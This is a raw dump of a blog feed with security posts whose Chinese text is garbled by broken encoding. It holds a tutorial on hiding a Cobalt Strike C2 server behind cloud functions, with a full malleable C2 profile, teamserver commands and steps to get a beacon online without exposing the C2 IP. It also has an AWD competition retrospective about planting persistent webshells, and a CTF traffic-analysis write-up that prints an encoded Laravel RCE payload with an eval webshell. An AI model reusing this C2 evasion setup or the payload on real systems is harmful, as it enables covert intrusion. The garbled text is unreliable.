alt="image-20211015185921658"></p><p>ç„¶åä¸‹ä¸€æ­¥ï¼Œäº‹ä»¶å‡½æ•°ï¼Œç‰ˆæœ¬é€‰æ‹©LATESTï¼Œä¸€å®šè¦å‹¾é€‰å“åº”é›†æˆã€‚ä¹‹åç‚¹ç«‹å³å®Œæˆå°±å¯ä»¥äº†ã€‚</p><p>å‘å¸ƒæœåŠ¡ä¹‹ååœ¨å³è¾¹å¯ä»¥çœ‹åˆ°APIçš„HTTPä¸HTTPSåœ°å€ï¼Œè®°ä½è¿™ä¸ªæœ‰ç”¨ï¼Œå½“ç„¶äº†ï¼Œåœ¨äº‘å‡½æ•°é‚£ä¹Ÿå¯ä»¥çœ‹ï¼ˆå‡½æ•°æœåŠ¡-è§¦å‘ç®¡ç†-è®¿é—®è·¯å¾„ï¼‰</p><p><img src="http://cdn.polowong.top/image-20211015190133119.png" alt="image-20211015190133119"></p><h1 id="cobalt-strikeé…ç½®"><a href="#cobalt-strikeé…ç½®" class="headerlink" title="cobalt strikeé…ç½®"></a>cobalt strikeé…ç½®</h1><p>CSçš„é…ç½®è¸©å¤§å‘ã€‚</p><p>é¦–å…ˆæ˜¯ç¼–å†™å¯¹åº”çš„profileï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">set</span> <span class="string">sample_name</span> <span class="string">&quot;t&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">sleeptime</span> <span class="string">&quot;3000&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">jitter</span>   <span class="string">&quot;0&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">maxdns</span>   <span class="string">&quot;255&quot;</span><span class="string">;</span></span><br><span class="line"><span class="string">set</span> <span class="string">useragent</span> <span class="string">&quot;Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line"><span class="string">http-get</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/x&quot;</span><span class="string">;</span></span><br><span class="line"></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">metadata</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;SESSIONID=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Server&quot;</span> <span class="string">&quot;Nodejs&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-stager</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x86</span> <span class="string">&quot;/vue.min.js&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">set</span> <span class="string">uri_x64</span> <span class="string">&quot;/bootstrap-2.min.js&quot;</span><span class="string">;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="string">http-post</span> &#123;</span><br><span class="line">  <span class="string">set</span> <span class="string">uri</span> <span class="string">&quot;/api/y&quot;</span><span class="string">;</span></span><br><span class="line">  <span class="string">client</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Accept&quot;</span> <span class="string">&quot;*/*&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">id</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">prepend</span> <span class="string">&quot;JSESSION=&quot;</span><span class="string">;</span></span><br><span class="line">          <span class="string">header</span> <span class="string">&quot;Cookie&quot;</span><span class="string">;</span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="string">server</span> &#123;</span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Content-Type&quot;</span> <span class="string">&quot;application/ocsp-response&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;content-transfer-encoding&quot;</span> <span class="string">&quot;binary&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">header</span> <span class="string">&quot;Connection&quot;</span> <span class="string">&quot;keep-alive&quot;</span><span class="string">;</span></span><br><span class="line">      <span class="string">output</span> &#123;</span><br><span class="line">          <span class="string">base64;</span></span><br><span class="line">          <span class="string">print;</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¼–å†™å®Œä¹‹åå‘½åä¸ºc2.profileï¼Œç„¶åç”¨csç›®å½•ä¸‹çš„c2lint.shè¿›è¡Œæ£€æŸ¥ï¼Œè¿™ä¸ªä¸œè¥¿çš„ä½œç”¨å°±æ˜¯æ£€æŸ¥ç¼–å†™çš„profileæ˜¯å¦æ­£ç¡®ã€‚</p><p>c2lint.sh ./c2.profile</p><p><img src="http://cdn.polowong.top/image-20211015190808713.png" alt="image-20211015190808713"></p><p>è¿™æ ·çœ‹æ˜¯æ²¡å•¥é—®é¢˜ï¼Œç„¶åè¿è¡Œteamserverçš„æ—¶å€™åé¢è·Ÿä¸Šprofileå°±å¯ä»¥äº†ï¼Œä¾‹å¦‚</p><p>./teamserver.sh 1.1.1.1 123456 c2.profile</p><p>è¿™æ ·å°±å¯ä»¥æŠŠprofileä½œä¸ºlistenerçš„é…ç½®ã€‚</p><p>å¯åŠ¨csåï¼Œæ·»åŠ http listenerï¼ŒHOSTSå’ŒSTAGERå¡«å†™å¦‚ä¸‹</p><p><img src="http://cdn.polowong.top/image-20211015191005476.png" alt="image-20211015191005476"></p><p>éƒ½æ˜¯ç”Ÿæˆçš„äº‘å‡½æ•°çš„åœ°å€ï¼Œæ³¨æ„æŠŠå‰é¢çš„HTTPï¼š//å»æ‰ï¼ï¼</p><p>ä¿å­˜åï¼Œç”ŸæˆEXEï¼Œä¸Šçº¿ã€‚</p><p>ç„¶ååœ¨victimä¸»æœºä¸ŠæŸ¥çœ‹æµé‡ï¼Œå¹¶æ²¡æœ‰å‘ç°C2çš„IPåœ°å€,140å¼€å¤´çš„åœ°å€ä¸æ˜¯æˆ‘çš„åœ°å€ã€‚</p><p><img src="http://cdn.polowong.top/image-20211015191107942.png" alt="image-20211015191107942"></p><p><img src="http://cdn.polowong.top/image-20211015191253179.png" alt="image-20211015191253179"></p><p>è¿™æ ·å°±ä½¿ç”¨äº‘å‡½æ•°å®ç°äº†C2çœŸå®IPçš„éšè—ï¼Œåœ¨CSä¸­ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨å‘½ä»¤ï¼Œè¯æ˜beaconå·¥ä½œæ— å¼‚å¸¸ã€‚</p><p><img src="http://cdn.polowong.top/image-20211015191425103.png" alt="image-20211015191425103"></p>]]></content>
      
      
      
        <tags>
            
            <tag> çº¢é˜ŸæŠ€èƒ½ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç»¿åŸæ¯AWDæ€»ç»“</title>
      <link href="2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/"/>
      <url>2021/10/15/%E7%BB%BF%E5%9F%8E%E6%9D%AFAWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™æ¬¡æ‰“ç»¿åŸæ¯ä»£ä»·æŒºå¤§çš„ï¼Œæ”¹ç­¾æœºç¥¨æå‰ä½äº†ä¸€æ™šå®¾é¦†ï¼Œåœ¨é«˜é“ç«™æ‰“äº†ä¸€å¤©åˆèµ›ï¼›è¿›äº†çº¿ä¸‹å­¦æ ¡ä¸æŠ¥é”€è·¯è´¹ï¼Œæ¥å›å¹³å‡ä¸€ä¸ªäºº1500å—ï¼Œä¸€å…±å»äº†å››ä¸ªäººã€‚æœ€åçš„ç»“æœæ˜¯ä¸ŠåˆCTFä¸€åˆ†æ²¡æ‹¿ï¼Œä¸‹åˆAWDæ‰“åˆ°äº†ç¬¬ä¹åï¼Œæ€»ä½“æ’åè¿˜æ˜¯æ²¡æœ‰æ’åˆ°å‰9ï¼Œåªç»™äº†ä¼˜èƒœå¥–ã€‚æ’‡å»è‡ªèº«å®åŠ›åŸå› å¤–ï¼Œæˆ‘æƒ³åæ§½ç»„å§”ä¼šï¼šä¸ºä»€ä¹ˆæœ¬æ¥è¯´åªæœ‰AWDç»“æœä¸Šåˆæ‰“CTF?è¯´æ˜¯CTF/AWDåˆ†å€¼ä¸€æ¯”ä¸€ï¼Œæ˜¯å¦ä¸¥æ ¼å±¥è¡Œï¼Ÿä½ çº¿ä¸‹AWDæä¸ªCTFæ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿé˜²æ­¢PYä¸Šåˆä¸ç¦æ­¢å»å•æ‰€ï¼Œä¸‹åˆAWDå´ç¦æ­¢å»å•æ‰€ï¼Œè°AWDè¿˜æœ‰ç©ºå»PYï¼Ÿæ¶ˆæ¯é€šçŸ¥æ··ä¹±ï¼Œåˆ°äº†éƒ‘å·æ‰çŸ¥é“è¦åšæ ¸é…¸ï¼Œè·å¥–é˜Ÿä¼å°‘ï¼Œå¥–é‡‘å°‘ï¼Œæ— ç°é‡‘ï¼Œåªæœ‰Eå¡ã€‚æˆ‘æ„¿ç§°ä¹‹ä¸ºå…¨å›½æœ€ç©·å›½å®¶ç½‘ç»œå®‰å…¨å®£ä¼ å‘¨æ´»åŠ¨ã€‚<br>ä¸‹é¢è¯´æˆ‘åœ¨æ¯”èµ›ä¸­è¿”çš„ä¸€äº›é”™è¯¯ã€‚ä¸ŠåˆCTFï¼Œæœ¬äººèœï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚</p><h1 id="è‡´å‘½"><a href="#è‡´å‘½" class="headerlink" title="è‡´å‘½"></a>è‡´å‘½</h1><p>AWDæµç¨‹ç¯èŠ‚å‡ºç°ä¸¥é‡é—®é¢˜ã€‚èµ›å‰æ¼”ç»ƒå››ä¸ªäººçš„é…åˆä¸­éƒ½æ²¡æœ‰æ¼”ç»ƒåˆ°æ–‡ä»¶ç›‘æ§è„šæœ¬çš„ä½¿ç”¨ï¼Œå¯¼è‡´è¢«åˆ«äººç§äº†ä¸æ­»é©¬æ‰å¤§åˆ†ã€‚åœ¨ç›‘æ§ä¸åˆ°æµé‡ã€pwné¢˜ä¸‹çº¿ã€webä¸€ç›´è¢«æ‰“çš„æƒ…å†µä¸‹å½“æ—¶æ²¡æœ‰æƒ³åˆ°ä¸æ­»é©¬è¿™ä¸ªäº‹æƒ…ï¼Œæ˜¯æˆ‘ç–å¿½äº†ã€‚ä¸Šäº†æ–‡ä»¶ç›‘æ§è„šæœ¬åå†ä¹Ÿæ²¡å¤±åˆ†ã€‚ï¼ˆè‡ªåŠ¨åˆ é™¤ä¸æ­»é©¬åŠä»»ä½•æ–°ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ— crontabï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>æ¯”èµ›çš„æ—¶å€™æˆ‘å¿˜è®°crontabè·¯å¾„äº†ï¼Œåªèƒ½çœ‹å½“å‰userï¼Œä½†shellçš„æƒé™å¤§éƒ¨åˆ†æ˜¯www-dataéœ€è¦åŠ å¼ºè®°å¿†</strong>ï¼‰</p><h1 id="ä¸¥é‡"><a href="#ä¸¥é‡" class="headerlink" title="ä¸¥é‡"></a>ä¸¥é‡</h1><p>è„šæœ¬ç¼–å†™èƒ½åŠ›è¿‡å·®ã€‚å½“é˜Ÿå‹é€šè¿‡æµé‡æŠ“å–åˆ°æ¼æ´åˆ©ç”¨æ–¹å¼æ—¶ï¼Œç»æˆ‘éªŒè¯ååº”è¯¥è¿…é€Ÿå†™å‡ºæ‰¹é‡åˆ©ç”¨è„šæœ¬ï¼Œåœ¨è¿™ä¸ªåœ°æ–¹å¡ä½äº†ï¼Œå¯¼è‡´å†™è„šæœ¬å†™çš„æ¯”è¾ƒæ…¢ï¼Œåº”è¯¥æ˜¯ä¸¢æ‰äº†è®¸å¤šåˆ†æ•°ã€‚</p><p>æ— æ³•è‡ªåŠ¨æäº¤flagã€‚å®‰æ’çš„HTTPSæµé‡ä¸çŸ¥é“ä¸ºå•¥æŠ“ä¸åˆ°ï¼Œæ²¡æœ‰åŠæ³•ç”¨è„šæœ¬è‡ªåŠ¨æäº¤flagã€‚</p><p>æ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨å·²çŸ¥æ¼æ´ç§æ¤ä¸æ­»é©¬ã€‚è¿™å¯¼è‡´ä¸¢äº†å¾ˆå¤šåˆ†æ•°</p><p>èµ›æ—¶è„šæœ¬ç»“æ„æ··ä¹±ï¼Œåº”å°†åŠŸèƒ½ç‚¹åˆ†å¼€ï¼ŒRCEåˆ©ç”¨å’Œç§é©¬åº”åŒæ—¶å°è¯•è¿›è¡Œï¼Œåˆ©ç”¨é©¬getflagçš„æ“ä½œåº”è¯¥åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚å¤šçº¿ç¨‹å°šæœªç†Ÿç»ƒæŒæ¡</p><p>AOIAWDèµ›å‰æœªæˆåŠŸéƒ¨ç½²ï¼Œä»…é watchbirdæ€»æ˜¯æ„Ÿè§‰åŠ›ä¸ä»å¿ƒã€‚</p><h1 id="è½»å¾®"><a href="#è½»å¾®" class="headerlink" title="è½»å¾®"></a>è½»å¾®</h1><p>èµ›æ—¶ç´§å¼ ï¼Œå¯¹å¾…é˜Ÿå‹çš„æ€åº¦æœ‰æ—¶è¿‡æ¿€ã€‚</p><h1 id="æ”¹è¿›"><a href="#æ”¹è¿›" class="headerlink" title="æ”¹è¿›"></a>æ”¹è¿›</h1><p>1.æé«˜è„šæœ¬ç¼–å†™èƒ½åŠ›ï¼ŒæŒæ¡å¤šçº¿ç¨‹ï¼Œä¼˜åŒ–è„šæœ¬ç»“æ„</p><p>2.åœ¨AWDæ¼”ç»ƒä¸­å°è¯•ä½¿ç”¨RCEæ¼æ´ç§æ¤ä¸æ­»é©¬å¹¶getflagã€‚</p><p>3.æœ¬åœ°éƒ¨ç½²AOIAWD</p><p>4.crontabè·¯å¾„ç†Ÿè®°ï¼Œé˜²æ­¢æœ‰äººå†™crontabã€‚</p><p>5.æ¨¡æ‹Ÿæ—¶ä¸¥æ ¼æ¼”ç»ƒæµç¨‹ï¼Œä¼˜åŒ–åˆ†å·¥ã€‚</p><p>6.åº”æ­£ç¡®å¯¹å¾…é˜Ÿå‹ï¼Œå…‹åˆ¶è‡ªå·±çš„æƒ…ç»ªã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™æ¬¡æˆ‘æœ‰ç‚¹æ‹‰è·¨ï¼Œä¸è¿‡é˜Ÿå‹çš„è¡¨ç°å¾ˆå¥½ï¼Œèƒ½å„å¸å…¶èŒçš„è´Ÿè´£æˆ‘æ‰€åˆ†é…çš„è®¤ä¸ºï¼ˆæµé‡ã€èµ›é¢˜ç›‘æ§ã€å¤‡ä»½ä¸æ¢å¤ã€æ€æ¯’ã€æµé‡å‘Šè­¦ç­‰ï¼‰æˆ‘è®¤ä¸ºæˆ‘çš„é˜Ÿå‹ç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹AWDèƒ½åšåˆ°è¿™ç§ç¨‹åº¦æ¯”æˆ‘å¼ºå¤ªå¤šäº†ã€‚ä¸‹æ¬¡AWDä¸€å®šæ‹¿ä¸‹ï¼</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Traffic analysis in Lvcheng Cup</title>
      <link href="2021/10/09/Traffic-analysis-in-Lvcheng-Cup/"/>
      <url>2021/10/09/Traffic-analysis-in-Lvcheng-Cup/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Target: <strong>FIND THE FLAG(hint : AntSwort traffic)</strong></p><p>Personally I think this problem is challenging for me,it contains Cobalt Strike traffic analysis, laravel Rce traffic analysis and AntSwort traffic analysis.</p><h1 id="AntSword-and-Laravel-RCE-Traffic-Analysis"><a href="#AntSword-and-Laravel-RCE-Traffic-Analysis" class="headerlink" title="AntSword  and Laravel RCE Traffic  Analysis"></a>AntSword  and Laravel RCE Traffic  Analysis</h1><p>There are many packets in the pcap file,personally Iâ€™â€™ll use http.request.method==POST to filter http traffic beacuse most of webshell are use post method sends data to victims.Obviously there are too many packets contains ignition field, after googling, I found that this is Laravel RCE explotiation. </p><p><img src="http://cdn.polowong.top/1633574050565kc7miz95.png?imageslim" alt="paste image"><br>Following figure shows that .config.php were frequently requested ,follow it in HTTP stream, obviously the webshell executed ls command.</p><p><img src="http://cdn.polowong.top/16335741885165rs7bwkh.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/1633574233022a3e3z8xv.png?imageslim" alt="paste image"></p><h2 id="node1"><a href="#node1" class="headerlink" title="node1"></a>node1</h2><p>Keep following requests which connnected to config.php,we can find a pacaket made an extract operation and the file name is secret.zip,this file is suspicious and it should be recovered .After extarcing HTTP objects I havenâ€™t find secret.zip,so keep following  packets.<br><img src="http://cdn.polowong.top/1633574349937r8r9xs6k.png?imageslim" alt="paste image"><br><img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image"></p><h2 id="node1-end"><a href="#node1-end" class="headerlink" title="node1 end"></a>node1 end</h2><p>In a packet we find PK filed in response data,so it should be recovered with zip file format.There is one thing to note,in the start and end postions of response data exists hex data,AntSword added it to reduce traffic character.</p><p><img src="http://cdn.polowong.top/16335744113565ygjm6if.png?imageslim" alt="paste image"></p><p>Use 010 editor to recover this file ,then open it, but it tips me password are required,now I didnâ€™t find any passwords,after fix ,check and broute tools I still canâ€™t open it.So I have to find the password.We can find that the secret file is .cobaltstrike.beacon_keys file ,itâ€™s serialized file contains public and private key.If we can crack the password and recover private key, the ciphertext between hacker and coblatstrike teamserver will be cracked.</p><p>In <strong>node 1</strong> we find an extract command were executed, so next setp is recover webshell contents and know the exact command, it must contains exact password.The webshell were written by Laravel RCE, so we should find what hacker did via Laravel RCE exploitation.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&